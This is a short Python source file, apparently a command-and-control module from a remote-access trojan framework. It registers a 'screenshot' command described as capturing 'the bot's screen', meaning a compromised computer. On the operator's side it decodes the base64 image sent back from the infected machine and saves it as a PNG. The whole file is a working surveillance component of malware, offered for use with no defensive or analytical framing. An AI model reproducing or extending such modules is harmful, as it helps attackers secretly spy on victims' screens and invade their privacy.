# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
from base64 import b64decode
from os import mkdir


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Take a screenshot of the bot's screen.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Local output name (Leave empty for <RANDOM>): "
        ]

    def setup(self, set_options):
        output_name = set_options[0]

        if not output_name:
            output_name = random_string(8)

        return True, {
            "response_options": {
                "output_name": output_name
            }
        }

    def process_response(self, response, response_options):
        output_name = "{}.png".format(response_options["output_name"])
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        if not path.isdir(OUTPUT_DIRECTORY):
            mkdir(OUTPUT_DIRECTORY)

        with open(output_file, "wb") as open_file:
            open_file.write(b64decode(response))

        self._view.output_separator()
        self._view.output("Screenshot saved to: {}".format(path.realpath(output_file)), "info")
